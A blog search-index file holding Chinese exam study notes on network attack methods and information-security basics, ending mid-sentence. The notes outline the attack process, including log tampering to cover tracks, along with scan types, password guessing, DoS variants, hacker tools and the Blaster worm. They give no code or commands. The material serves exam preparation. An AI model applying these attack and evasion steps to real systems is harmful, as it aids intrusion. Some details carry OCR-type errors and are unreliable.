<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第2章：网络攻击原理与常用方法</title>
      <link href="/chapter2-attack-priciples-and-methods/"/>
      <url>/chapter2-attack-priciples-and-methods/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>备考合集：<a href="https://jenchoi.tk/information-security-engineer">2023软考-信息安全工程师</a></strong></p></blockquote><h1 id="本章分析"><a href="#本章分析" class="headerlink" title="本章分析"></a>本章分析</h1><ul><li>分值：3-4分</li><li>重点：端口扫描、恶意代码、拒绝服务攻击、DDOS 攻击</li></ul><h1 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h1><p><strong>网络攻击是指损害网络系统安全属性的危害行为</strong>。危害行为导致网络系统的机密性、完整性、可用性、可控性、真实性、抗抵赖性等受到不同程度的破坏。</p><p>常见的危害行为有四个<strong>基本类型</strong>：<br>(1) 信息泄露攻击（机密性）<br>(2) 完整性破坏攻击（完整性）<br>(3) 拒绝服务攻击（可用性）<br>(4) 非法使用攻击。</p><h1 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h1><p>（1）攻击树模型（故障树）<br>（2）MITRE ATT &amp; CK 模型（攻击矩阵）<br>（3）网络杀伤链 (Kill Chain) 模型</p><h1 id="网络攻击一般流程"><a href="#网络攻击一般流程" class="headerlink" title="网络攻击一般流程"></a>网络攻击一般流程</h1><ul><li>(1) 隐藏攻击源。隐藏黑客主机位置使得系统管理无法追踪。<ul><li>利用被侵入的主机作为跳板；</li><li>免费代理网关；</li><li>伪造 IP 地址；</li><li>冒用户账号。</li></ul></li><li>(2) 收集攻击目标信息。确定攻击目标并收集目标系统的有关信息。</li><li>(3) 挖掘漏洞信息。从收集到的目标信息中提取可使用的漏洞信息。</li><li>(4) 获取目标访问权限。获取目标系统的普通或特权账户的权限。</li><li>(5) 隐蔽攻击行为。隐蔽在目标系统中的操作，防止入侵行为被发现。<ul><li>连接隐藏、进程隐藏、文件隐藏</li></ul></li><li>(6) 实施攻击。进行破坏活动或者以目标系统为跳板向其他系统发起新的攻击。</li><li>(7) 开辟后门。在目标系统中开辟后门，方便以后入侵。</li><li>(8) 清除攻击痕迹。避免安全管理员的发现、追踪以及法律部门取证。<ul><li>篡改曰志文件中的审计信息；</li><li>改变系统时间造成日志文件数据紊乱以迷惑系统管理员；</li><li>删除或停止审计服务进程；</li><li>干扰入侵检测系统的正常运行；</li><li>修改完整性检测标签。</li></ul></li></ul><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>目的：找出目标系统上提供的服务列表</p><p>扫描类型</p><ol><li>完全连接扫描。三次握手，建立连接</li><li>半连接扫描。只完成前两次握手，不建立一次完整的连接</li><li>SYN 扫描。发送连接请求，根据响应状况判断（ACK-开放，RESET-未开放）</li><li>ID 头信息扫描<br> 需要用一台第三方机器配合扫描，并且这台机器的网络通信量要非常少，即dumb 主机。<br> 首先由源主机A向 dumb 主机B发出连续的 PING 数据包，并且查看主机B返回的数据包ID 头信息。一般而言，每个顺序数据包的 ID 头的值会增加 。然后由源主机A假冒主机B的地址向目的主机C的任意端口 (1 ~65535) 发送 SYN 数据包。这时，主机C向主机B发送的数据包有两种可能的结果：<br> • SYNIACK 表示该端口处千监听状态。<br> • RSTIACK 表示该端口处千非监听状态。<br> 那么，由后续 PING 数据包的响应信息的 ID 头信息可以看出，如果主机C的某个端口是开放的，则主机B返回A的数据包中， ID 头的值不是递增 1，而是大于1。如果主机C的某个端口是非开放的，则主机B返回A的数据包中，ID 头的值递增 1，非常规律。</li><li>隐蔽扫描。绕过 IDS 、防火墙和监视系统等安全机制，取得目标主机端口信息的一种扫描方式。</li><li>SYNIACK 扫描<br> 直接发送 SYN|ACK 数据包，而不是先发送SYN数据包。由于这种方法不发送 SYN 数据包，目标主机会认为这是一次错误的连接，从而会报错。<ul><li>关闭：返回 RST 信息</li><li>开放：不返回任何信息，直接数据包抛弃</li></ul></li><li>FIN 扫描<br> 发送 FIN 数据包，然后查看反馈信息。<ul><li>关闭：返回 RESET 信息</li><li>开放：不返回任何信息</li></ul></li><li>ACK 扫描<br> 发送 FIN 数据包，然后查看反馈数据包的 TTL 值和 WIN 值<ul><li>关闭：TTL &gt; 64，WIN &#x3D; 0</li><li>开放：TTL &lt; 64，WIN &gt; 0</li></ul></li><li>NULL 扫描<br> 将源主机发送的数据包中的 ACK FIN RST SYN URG PSH 等标志位全部置空<ul><li>关闭：RST信息</li><li>开放：无返回</li></ul></li><li>XMAS 扫描<br>与 NULL 扫描原理相同，将要发送的数据包中的 ACK FIN RST SYN URG PSH 等头标志位全部置成 1 。<ul><li>关闭：RST信息</li><li>开放：无返回</li></ul></li></ol><h1 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h1><p>主要工作流程</p><ol><li>建立与目标网络服务的网络连接；</li><li>选取1个用户列表文件及字典文件；</li><li>在用户列表文件及字典文件中，选取1组用户和口令，按网络服务协议规定，将用户名及口令发送给目标网络服务端口；</li><li>检测远程服务返回信息，确定口令尝试是否成功；</li><li>再取另1组用户和口令，重复循环试验，直至口令用户列表文件及字典文件选取完毕</li></ol><h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>缓冲区溢出攻击可以使攻击者有机会获得1台主机的<strong>部分或全部的控制权</strong>。</p><p>据统计，缓冲区溢出攻击占远程网络攻击的绝大多数。<br>缓冲区溢出成为远程攻击主要方式的原因是，<strong>缓冲区溢出漏洞会给予攻击者控制程序执行流程的机会</strong>。攻击者将特意构造的攻击代码植入有缓冲区溢出漏洞的程序之中，改变漏洞程序的执行过程，就可以得到被攻击主机的控制权。</p><h1 id="⭐恶意代码"><a href="#⭐恶意代码" class="headerlink" title="⭐恶意代码"></a>⭐恶意代码</h1><p>恶意代码是网络攻击常见的攻击手段。</p><p>常见的恶意代码类型</p><ul><li><p>计算机病毒</p></li><li><p>网络蠕虫</p></li><li><p>特洛伊木马</p></li><li><p>后门</p></li><li><p>逻辑炸弹</p></li><li><p>僵尸网络</p></li><li><p>网络蠕虫程序是 1988 年由小莫里斯编制的，该程序具有复制传播功能，可以感染 UNIX 系统主机，使网上 6000 多台主机无法运行；</p></li><li><p>2001年8月，红色代码蠕虫病毒利用微软 Web 服务器 IIS4.0 或 5.0 中 index 服务的安全缺陷，通过自动扫描感染方式传播蠕虫；</p></li><li><p>2010 年“震网“网络蠕虫是首个专门用于定向攻击真实世界中基础（能源）设施的恶意代码。</p></li></ul><p>恶意代码的一般命名格式：&lt;恶意代码前缀&gt;.&lt;恶意代码名称&gt;.&lt;恶意代码后缀&gt;<br>常用恶意代码前缀</p><ul><li>系统病毒：Win32、PE、Win95、W32、W95等</li><li>网络蠕虫：Worm (勒索软件 WanaCra</li><li>木马病毒：Trojan</li><li>脚本病毒：Script</li><li>宏病毒的：Macro，其可能还有第二前缀是 Word、Word97、Excel、Exce197</li><li>后门程序： Backdoor</li><li>破坏性程序：Harm</li><li>玩笑病毒：Joke</li><li>捆绑机病毒：Binder</li></ul><h1 id="⭐拒绝服务"><a href="#⭐拒绝服务" class="headerlink" title="⭐拒绝服务"></a>⭐拒绝服务</h1><p>拒绝服务攻击是指攻击者利用系统的缺陷，执行一些恶意的操作，使得合法的系统用户不能及时得到应得的服务或系统资源，如 CPU 处理时间、存储器、网络带宽等。</p><p>拒绝服务攻击往往造成计算机或网络无法正常工作，进而会使一个依赖于计算机或网络服务的企业不能正常运转。</p><p>最本质的特征：<strong>延长服务等待时间</strong><br>当服务等待时间超过某个阈值时，用户因无法忍耐而放弃服务。拒绝服务攻击延迟或者阻碍合法的用户使用系统提供的服务，对关键性和实时性服务造成的影响最大。</p><p>特点：</p><ol><li>难确认性。拒绝服务攻击很难判断，用户在自己的服务得不到及时响应时，并不认为自己（或系统）受到攻击，反而可能认为是系统故障造成 时的服务失效。</li><li>隐蔽性。正常请求服务隐藏拒绝服务攻击的过程。</li><li>资源有限性。由于计算机资源有限，容易实现拒绝服务攻击。</li><li>软件复杂性。由于软件所固有的复杂性，设计实现难以确保软件没有缺陷。因而攻击者有机可乘，可以直接利用软件缺陷进行拒绝服务攻击，例如泪滴攻击。</li></ol><p>类型</p><ol><li>同步包风暴 (SYN Flood)<br> 发送多个同步数据包 (SYN Packet) 给服务器，服务器因无法收到确认数据包 (ACK Packet) ，使 TCP&#x2F;IP 协议的三次握手无法顺利完成，因而无法建立连接。其原理是发送大量半连接状态的服务请求，Unix 等服务主机无法处理正常的连接请求，因而影响正常运作。</li><li>UDP 洪水 (UDP Flood)<br> 利用简单的 TCP&#x2F;IP 服务，如用 Chargen 和 Echo 传送毫无用处的占满带宽的数据。通过伪造与某一主机的 Chargen 服务之间的一次 UDP 连接，回复地址指向开放 Echo 服务的一台主机，生成在两台主机之间的足够多的无用数据流。</li><li>Smurf 攻击<br> 一种简单的 Smurf 攻击是将回复地址设置成目标网络广播地址的 ICMP 应答请求数据包，使该网络的所有主机都对此 ICMP 应答请求作出应答，导致网络阻塞，比 ping of death 洪水的流量高出一或两个数量级。<br> 更加复杂的 Smurf 攻击是将源地址改为第三方的目标网络，最终导致第三方网络阻塞。</li><li>垃圾邮件<br> 攻击者利用邮件系统制造垃圾信息，甚至通过专门的邮件炸弹 (mail bomb) 程序给受害用户的信箱发送垃圾信息，耗尽用户信箱的磁盘空间，使用户无法应用这个信箱。</li><li>消耗 CPU 和内存资源<br> 利用目标系统的计算算法漏洞，构造恶意输入数据集，导致目标系统的 CPU 或内存资源耗尽，从而使目标系统瘫痪，如 Hash DoS</li><li>死亡之 ping (ping of death)<br> 早期，路由器对包的最大尺寸都有限制，许多操作系统在实现 TCP&#x2F;IP 堆栈时，规定 ICMP包小千等千 64KB，并且在对包的标题头进行读取之后，要根据该标题头中包含的信息为有效载荷生成缓冲区。当产生畸形的、尺寸超过 ICMP 上限的包，即加载的尺寸超过 64KB 上限时，就会出现内存分配错误，导致 TCP&#x2F;IP 堆栈崩溃，使接收方停机。</li><li>泪滴攻击 (Teardrop Attack)<br> 泪滴攻击暴露出 IP 数据包分解与重组的弱点 IP 数据包在网络中传输时，会被分解成许多不同的片传送，并借由偏移量字段 (Offset Field) 作为重组的依据。泪滴攻击通过加入过多或不必要的偏移量字段，使计算机系统重组错乱，产生不可预期的后果。</li><li>分布式拒绝服务攻击 (Distributed Denial of Service Attack)<br> 分布式拒绝服务攻击是指植入后门程序从远程遥控攻击，攻击者从多个已入侵的跳板主机控制数个代理攻击主机，所以攻击者可同时对已控制的代理攻击主机激活干扰命令，对受害主机大量攻击。<br> 分布式拒绝服务攻击程序，最著名的有 Trinoo、TFN、TFN2K、Stacheldraht四种</li></ol><h1 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h1><p>网络钓鱼 (Phishing) 是一种通过假冒可信方（知名银行、在线零售商和信用卡公司等可信的品牌）提供网上服务，以欺骗手段获取敏感个人信息（如口令、信用卡详细信息等）的攻击方式。</p><p>目前，网络钓鱼综合利用社会工程攻击技巧和现代多种网络攻击手段，以达到欺骗意图。<br>最典型的网络钓鱼方法是，网络钓鱼者利用欺骗性的电子邮件和伪造的网站来进行诈骗活动，诱骗访问者提供一些个人信息，如信用卡号、账户和口令、社保编号等内容，以谋求不正当利益。<br>例如，网络钓鱼攻击者构造 封所谓“安全提醒＂邮件发给客户，然后让客户点击虚假网站 填写敏感的个人信息 这样网络钓鱼攻击者就能获取受害者的个人信息，并非法利用</p><h1 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h1><p>网络窃听是指利用网络通信技术缺陷，使得攻击者能够获取到其他人的网络通信信息。</p><p>常见的网络窃听技术手段</p><ul><li>网络嗅探</li><li>中间人攻击</li></ul><p>一般的计算机系统通常只接收目的地址指向自己的网络包，而忽略其他的包。但在很多情况下，一台计算机的网络接口可能收到目的地址并非指向自身的网络包，在完全的广播子网中，所有涉及局域网中任何一台主机的网络通信内容均可被局域网中所有的主机接收到，这就使得网络窃听变得十分容易。网络攻击者将主机网络接口的方式设成“杂乱”模式，就可以接收整个网络上的信息包，从而可以获取敏感的口令，甚至将其重组，还原为用户传递的文件。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在Web 服务中，一般采用三层架构模式：<strong>浏览器＋Web 服务器＋数据库</strong><br>其中， Web 脚本程序负责处理来自浏览器端提交的信息，如用户登录名和密码、查询请求等。但是，由于 Web脚本程序的编程漏洞，对来自浏览器端的信息缺少输入安全合法性检查，网络攻击者利用这种类型的漏洞 SQL 命令插入 Web 表单的输入域或页面的请求查找字符串，欺骗服务器执行恶意的 SQL 命令。</p><h1 id="社交工程"><a href="#社交工程" class="headerlink" title="社交工程"></a>社交工程</h1><p>网络攻击者通过一系列的社交活动，获取需要的信息。例如伪造系统管理员的身份，给特定的用户发电子邮件骗取他的密码口令。有的攻击者会给用户送免费实用程序，不过该程序除了完成用户所需的功能外，还隐藏了 个将用户的计算机信息发送给攻击者的功能。很多时候，没有经验的网络用户容易被攻击者欺骗，泄露相关信息。例如，攻击者打电话给公司职员，自称是网络安全管理成员，并且要求获得用户口令。攻击者得到用户口令后，就能够滥用合法用户的权利。</p><h1 id="电子监听"><a href="#电子监听" class="headerlink" title="电子监听"></a>电子监听</h1><p>网络攻击者采用电子设备远距离地监视电磁波的传送过程。灵敏的无线电接收装置能够在远处看到计算机操作者输入的字符或屏幕显示的内容。</p><h1 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h1><p>会话劫持是指攻击者在初始授权之后建立一个连接，在会话劫持以后，攻击者具有合法用户的特权权限。<br>例如，一个合法用户登录一台主机，当工作完成后，没有切断主机。然后，攻击者乘机接管，因为主机并不知道合法用户的连接已经断开。于是攻击者能够使用合法用户的所有权限。典型的实例是 “TCP 会话劫持“。</p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>漏洞扫描是一种自动检测远程或本地主机安全漏洞的软件，通过漏洞扫描器可以自动发现系统的安全漏洞。<br>网络攻击者利用漏洞扫描来搜集目标系统的漏洞信息，为下一步的攻击做准备。</p><p>常见的漏洞扫描技术</p><ul><li>CGI 漏洞扫描</li><li>弱口令扫描</li><li>操作系统漏洞扫描</li><li>数据库漏洞扫描</li></ul><p>一些黑客或安全入员为了更快速地查找网络系统中的漏洞，会针对某个漏洞开发专用的漏<br>洞扫描工具，例如 RPC 漏洞扫描器。</p><h1 id="代理技术"><a href="#代理技术" class="headerlink" title="代理技术"></a>代理技术</h1><p>网络攻击者通过免费代理服务器进行攻击，其目的是以代理服务器为“攻击跳板”，即使攻击目标的网络管理员发现了，也难以追踪到网络攻击者的真实身份或 IP 地址。<br>为了增加追踪的难度，网络攻击者还会用多级代理服务器或者“跳板主机”来攻击目标。</p><p>在黑客中，代理服务器被叫作“肉鸡”，黑客常利用所控制的机器进行攻击活动，例如 DDoS 攻击。</p><h1 id="数据加密"><a href="#数据加密" class="headerlink" title="数据加密"></a>数据加密</h1><p>网络攻击者常常采用数据加密技术来逃避网络安全管理人员的追踪。<br>加密使网络攻击者的数据得到有效保护，即使网络安全管理人员得到这些加密的数据，没有密钥也无法读懂，这样就实现了攻击者的自身保护。<br>攻击者的安全原则是，任何与攻击有关的内容都必须加密或者立刻销毁。</p><h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><ol><li>扫描器<ul><li>分类<ul><li>地址扫描器</li><li>端口扫描器</li><li>漏洞扫描器</li></ul></li><li>常用软件：nmap、Nessus、Super Scan</li></ul></li><li>远程监控<br> 冰河、网络精灵、 Netcat</li><li>密码破解<ul><li>破解方式：口令猜测、穷举搜索、撞库等</li><li>常见工具<ul><li>John the Ripper用于检查 Unix&#x2F;Linux 系统的弱口令</li><li>LOphtCrack：用于破解 Windows 系统口令</li></ul></li></ul></li><li>网络嗅探器<br> 网络嗅探器 (Network Sniffer) 是一种黑客攻击工具，通过网络嗅探，黑客可以截获网络的信息包，之后对加密的信息包进行破解，进而分析包内的数据，获得有关系统的信息。如可以截获个人上网的信息包分析上网账号、系统账号、电子邮件账号等个人隐私资料。网络嗅探类软件已经成为黑客获取秘密信息的重要手段.<ul><li>常见的网络嗅探器工具<ul><li>Tcpdump&#x2F;WireShark Tcpdump 是基于命令行的网络数据包分析软件，可以作为网络嗅探工具，能把匹配规则的数据包内容显示出来。而 WireShark 则提供图形化的网络数据包分析功能，可视化地展示网络数据包的内容。</li><li>DSniff DSniff 是由 Dug Song 开发的一套包含多个工具的软件套件，包括 dsniff、filesnarf、mailsnarf、msgsnarf、rlsnarf、webspy 。使用 DSniff 可以获取口令、邮件、文件等信息。</li></ul></li></ul></li><li>安全渗透工具箱<br> MSF、BackTrack5</li></ol><h1 id="网络攻击案例"><a href="#网络攻击案例" class="headerlink" title="网络攻击案例"></a>网络攻击案例</h1><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2><p>DDoS 攻击步骤</p><ol><li>通过探测扫描大量主机，寻找可以进行攻击的目标</li><li>攻击有安全漏洞的主机，并设法获取控制权</li><li>在已攻击成功的主机中安装客户端攻击程序</li><li>利用已攻击成功的主机继续进行扫描和攻击</li><li>当攻击客户端达到一定的数目后，攻击者在主控端给客户端攻击程序发布向特定目标进行攻击的命令。</li></ol><p>从分布式拒绝服务攻击的案例来看，攻击者进行大型或复杂的攻击之前，需要利用已攻击成功的主机，时机成熟后再向最终的目标发起攻击。从这一点上来说，大型或复杂的攻击并不能一步到位，而是经过若干个攻击操作步骤后才能实现最终的攻击意图。</p><p>DDoS 常用的攻击技术手段</p><ul><li>HTTP Flood 攻击：利用僵尸主机向特定目标网站发送大量的 HTTP GET 请求，以导致网站瘫痪</li><li>SYN Flood 攻击：击利用 TCP&#x2F;IP 协议的安全缺陷，伪造主机发送大量的 SYN 包到目标系统，导致目标系统的计算机网络瘫痪</li><li>DNS 放大攻击：攻击者假冒目标系统向多个 DNS 解析服务器发送大量请求，而导致 DNS解析服务器同时应答目标系统，产生大量网络流量，形成拒绝服务</li></ul><h2 id="W32-Blaster-Worm"><a href="#W32-Blaster-Worm" class="headerlink" title="W32.Blaster.Worm"></a>W32.Blaster.Worm</h2><p>W32.Blaster.Worm 是一种利用 DCOM RPC 漏洞进行传播的网络蠕虫，其传播能力很强。感染蠕虫的计算机系统运行不稳定，系统会不断重启。并且该蠕虫还将对 windowsupdate.com<br>进行拒绝服务攻击，使得受害用户不能及时地得到这个漏洞的补丁。</p><p>当W32.Blaster.Worm 运行时，会进行以下操作：<br>(1) 创建一个名为 BILLY 的互斥体。如果这个互斥体存在，蠕虫将放弃感染并退出。<br>(2) 在注册表中添加下列键值：”windows auto update”&#x3D;”msblast.exe” ，并且将其添加至：HKEY LOCAL MACHINE\SOFTWARE\Microsoft\Windows\Current Version\Run ，这样就可以使蠕虫在系统被重起的时候能够自动运行。<br>(3) 蠕虫生成攻击 IP 地址列表，尝试去感染列表中的计算机，蠕虫对有 DCOMRPC 漏洞的机器发起 TCP 135 端口的连接，进行感染。<br>(4) TCP 4444 端口绑定一个 cmd.exe 的后门。<br>(5) UDP port69 口上进行监听。如果收到了一个请求，将把 Msblast.exe 发送给目标机器。<br>(6) 发送命令给远端的机器使它回联已经受到感染的机器并下载 Msblast.exe<br>(7) 检查当前日期及月份，若当前日期为 16 日或以后，或当前月份处在 月到 12 月之间，W32.Blaster Worm 蠕虫将对 windowsupdate.com 发动 TCP 同步风暴拒绝服务攻击</p><h2 id="网络安全导致停电事件"><a href="#网络安全导致停电事件" class="headerlink" title="网络安全导致停电事件"></a>网络安全导致停电事件</h2><p>本网络安全事件材料来源于北京安天网络安全技术有限公司（以下简称安天公司）发布的<br>《乌克兰电力系统遭受攻击事件综合分析报告》及相关网络信息。<br>2015.12.23 日，乌克兰多地区发生同时停电的事件。调查显示，乌克兰电厂停电是因网络攻击导致电力基础设施被破坏。<br>黑客首先利用钓鱼邮件，欺骗电力公司员工下载了带有 BlackEnergy 的恶意代码文件，然后诱导用户打开这个文件，激活木马，安装 SSH后门和系统自毁工具 Killdisk, 致使黑客最终获得了主控电脑的控制权。最后，黑客远程操作恶意代码将电力公司的主控计算机与变电站断连并切断电源；同时，黑客发动 DDoS 攻击电力客服中心，致使电厂工作人员无法立即进行电力维修工作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第1章：网络信息安全概述</title>
      <link href="/chapter1-information-security-overview/"/>
      <url>/chapter1-information-security-overview/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>备考合集：<a href="https://jenchoi.tk/information-security-engineer">2023软考-信息安全工程师</a></strong></p></blockquote><h1 id="本章分析"><a href="#本章分析" class="headerlink" title="本章分析"></a>本章分析</h1><ul><li>分值：选择题2-3分，案例题6分</li><li>重点<ul><li>1.3 网络信息安全属性(CIA)</li><li>1.4 网络信息安全功能</li></ul></li></ul><h1 id="定义、现状"><a href="#定义、现状" class="headerlink" title="定义、现状"></a>定义、现状</h1><p>网络发展现状：<strong>数字化、网络化、智能化</strong>成为信息社会的主要特征，”万物互联”时代已经来临。</p><ul><li>狭义上的网络信息安全特指网络信息系统的各组成要素符合安全属性的要求，即<strong>机密性、完整性、可用性、抗抵赖性、可控性</strong></li><li>广义上的网络信息安全是涉及国家安全、城市安全、经济安全、社会安全、生产安全、人身安全等在内的”大安全“</li></ul><h1 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h1><p>围绕网络安全问题，保障网络信息安全的对象内容、理念方法、持续时间都在不断演变，其新的变化表现为三个方面</p><ul><li>一是保障内容从<strong>单维度向多维度</strong>转变，保障的维度包含网络空间域、物理空间域、社会空间域</li><li>二是网络信息安全保障措施<strong>从单一性（技术） 向综合性</strong>（法律、政策、技术、管理、产业、教育）演变</li><li>三是保障时间维度要求<strong>涵盖网络系统的整个生命周期</strong>，保障响应速度要求不断缩短，网络信息安全没有战时、平时之分，而是时时刻刻</li></ul><h1 id="法律法规"><a href="#法律法规" class="headerlink" title="法律法规"></a>法律法规</h1><p><strong>2016 年</strong>国家发布了《国家网络空间安全战略》，相关的网络安全法律法规政政策也相继出台<br>《中华人民共和国网络安全法》已于 <strong>2017 年 6 月 1日</strong>起实施。为加强网络安全教育，网络空间安全已被增设为一级学科</p><h1 id="⭐基本属性"><a href="#⭐基本属性" class="headerlink" title="⭐基本属性"></a>⭐基本属性</h1><p>常见的网络安全基本属性有<strong>机密性、完整性、可用性、抗抵赖性、可控性</strong>，此外还有真实性、时效性、合规性、隐私性、合规性、公平性、可靠性、可生存性。</p><ul><li><strong>机密性</strong>(<strong>C</strong>onfidentiality): 网络信息不泄露给非授权的用户、实体或程序，能够防止非授权者获取信息</li><li><strong>完整性</strong>(<strong>I</strong>ntegrity): 网络信息或系统未经授权不能进行更改的特性</li><li><strong>可用性</strong> (<strong>A</strong>vailability): 合法许可的用户能够及时获取网络信息或服务的特性</li><li>抗抵赖性: 防止网络信息系统相关用户否认其活动行为的特性</li><li>可控性: 是指网络信息系统责任主体对其具有管理、支配能力的属姓，能够根据授权规则对系统进行有效掌握和控制，使得管理者有效地控制系统的行为和信息的使用，符合系统运行目标<br><em><strong>机密性、完整性、可用性分别指网络信息系统 CIA 三性</strong></em></li><li>真实性：是指网络空间信息与实际物理空间、社会空间的客观事实保持一致性</li><li>时效性：是指网络空间信息、服务及系统能够满足时间约束要求</li><li>合规性：是指网络信息、服务及系统符合法律法规政策、标准规范等要求</li><li>公平性：是指网络信息系统相关主体处于同等地位处理相关任务，任何一方不占据优势的特性要求</li><li>可靠性：是指网络信息系统在规定条件及时间下，能够有效完成预定的系统功能的特性</li><li>可生存性：是指网络信息系统在安全受损的情形下，提供最小化、必要的服务功能，能够支撑业务继续运行的安全特性</li></ul><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><ul><li>宏观目标：指网络信息系统满足国家安全需求特性符合国家法律法规政策要求，如网络主权、网络合规等。</li><li>微观目标：指网络信息系统的具体安全要求。</li><li>具体目标是保障网络信息及相关信息系统免受网络安全威胁，相关保护对象满足网络安全基本属性要求，用户网络行为符合国家法律法规要求，网络信息系统能够支撑业务安全持续运营数据安全得到有效保护。</li></ul><h1 id="⭐功能"><a href="#⭐功能" class="headerlink" title="⭐功能"></a>⭐功能</h1><p>要实现网络信息安全基本目标，网络应具备<strong>防御、监测、应急和恢复</strong>等基本功能。</p><ul><li>防御：是指采取各种手段和措施，使得网络系统具备阻止、抵御各种已知网络安全威胁的功能</li><li>检测：是指采取各种手段和措施，检测、发现各种已知或未知的网络安全威胁的功能</li><li>应急：是指采取各种手段和措施，针对网络系统中的突发事件，具备及时响应和处置网络攻击的功能</li><li>恢复：是指采取各种手段和措施，针对已经发生的网络灾害事件，具备恢复网络系统运行的功能</li></ul><h1 id="基本技术要求"><a href="#基本技术要求" class="headerlink" title="基本技术要求"></a>基本技术要求</h1><ul><li>物理环境安全：是指包括环境、设备和记录介质在内的所有支接网络系统运行的硬件的总体安全，是网络系统安全、可靠、不间断运行的基本保证。物理安全需求主要包括环境安全、设备安全、存储介质安全</li><li>安全认证：是实现网络资源访问控制的前提和依据,是有效保护网络管理对象的重要技术方法。网络认证的作用是标识鉴别网络资源访问者的身份的真实性，防止用户假冒身份访问网络资源。</li><li>访问控制：是有效保护网络管理对象，使其免受威胁的关键技术方法。其目标主要有两个<ul><li>(1) 限制非法用户获取或使用网络资源</li><li>(2) 防止合法用户滥用权限，越权访问网络资源</li></ul></li><li>安全保密：网络安全保密的目的就是防止非授权的用户访问网上信息或网络设备</li><li>漏洞扫描：入侵者通常都是通过一些程序来探测网络系统中存在的安全漏洞，然后通过所发现的安全漏洞，采取相应技术进行攻击。因此，网络系统中需配备弱点或漏洞扫描系统，用以检测网络中是否存在安全漏洞，以便网络安全管理员根据漏洞检测报告，制定合适的漏洞管理方法</li><li>恶意代码防护：网络是病毒、蠕虫、特洛伊木马等恶意代码最好、最快的传播途径之一。恶意代码可以通过网上文件下载、电子邮件、网页、文件共享等传播方式进入个人计算机或服务器。因此，防范恶意代码是网络系统必不可少的安全需求。</li><li>内容安全：是指相关网络信息系统承载的信息及数据符合法律法规要求，防止不良信息及垃圾信息传播。相关网络信息内容安全技术主要有垃圾邮件过滤、IP 地址&#x2F;URL 过滤、自然语言分析处理等</li><li>监测及预警：网络系统面临着不同级别的威胁，网络安全运行是一件复杂的工作。网络安全监测的作用在于发现综合网系统入侵活动和检查安全保护措施的有效性，以便及时报警给网络安全管理员，对入侵者采取有效措施，阻止危害扩散并调整安全策略</li><li>应急响应：网络系统所遇到的安全威胁往往难以预测，虽然采取了一些网络安全防范措施，但是由于人为或技术上的缺陷，网络信息安全事件仍然不可避免地会发生。既然网络信息安全事件不能完全消除，则必须采取一些措施来保障在出现意外的情况下，恢复网络系统的正常运转。同时，对于网络攻击行为进行电子取证，打击网络犯罪活动。</li></ul><h1 id="安全管理"><a href="#安全管理" class="headerlink" title="安全管理"></a>安全管理</h1><ul><li>定义：是指对网络资产采取合适的安全措施，以确保网络资产的可用性、完整性、可控制性和抗抵赖性等，不致因网络设备、网络通信协议、网络服务、网络管理受到人为和自然因素的危害，而导致网络中断、信息泄露或破坏。</li><li>管理对象：主要包括网络设备、网络通信协议、网络操作系统、网络服务、安全网络管理等在内的所有支持网络系统运行的软、硬件总和。网络信息安全涉及内容有物理安全、网络通信安全、操作系统安全、网络服务安全、网络操作安全以及人员安全。</li><li>管理目标：通过适当的安全防范措施，保障网络的运行安全和信息安全，满足网上业务开展的安全要求。</li><li><strong>管理方法</strong>：风险管理、等级保护、纵深防御、层次化保护、应急响应以及PDCA (Plan-Do-Check-Act) 方法等</li><li>管理要素：网络管理对象、网络威胁、网络脆弱性、网络风险、 网络保护措施<ul><li>管理对象：企业、机构直接赋予了价值而需要保护的资产。它的存在形式包括有形的和无形的，如网络设备硬件、软件文档是有形的，而服务质量、网络带宽则是无形的。</li><li>网络威胁：根据威胁主体的自然属性，可分为自然威胁和人为威胁。自然威胁有地震、雷击、洪水火灾、静电、鼠害和电力故障等。从威胁对象来分类，可分为物理安全威胁、网络通信威胁、网络服务威胁、网络管理威胁</li><li>脆弱性：计算系统中与安全策略相冲突的状态或错误，它将导致攻击者非授权访问、假冒用户执行操作及拒绝服务。CC 标准指出，脆弱性的存在将会导致风险，而威胁主体利用脆弱性产生风险。</li><li>网络风险：特定的威胁利用网络管理对象所存在的脆弱性，导致网络管理对象的价值受到损害或丢失的可能性。简单地说，网络风险就是网络威胁发生的概率和所&#x2F;造成影响的乘积。网络安全管理实际上是对网络系统中网管对象的风险进行控制</li><li>保护措施：为对付网络安全威胁，减少脆弱性，限制意外事件的影响，检测意外事件并促进灾难恢复而实施的各种实践、规程和机制的总称。</li></ul></li></ul><h1 id="安全管理流程"><a href="#安全管理流程" class="headerlink" title="安全管理流程"></a>安全管理流程</h1><ol><li>确定网络信息安全管理对象</li><li>评估网络信息安全管理对象的价值</li><li>识别网络信息安全管理对象的威胁</li><li>识别网络信息安全管理对象的脆弱性</li><li>确定网络信息安全管理对象的风险级别</li><li>制定网络信息安全防范体系及防范措施</li><li>实施和落实网络信息安全防范措施</li><li>运行&#x2F;维护网络信息安全设备、配置</li></ol><h1 id="常见安全管理评估"><a href="#常见安全管理评估" class="headerlink" title="常见安全管理评估"></a>常见安全管理评估</h1><ul><li>网络安全等级保护测评</li><li>信息安全管理体系认证(简称 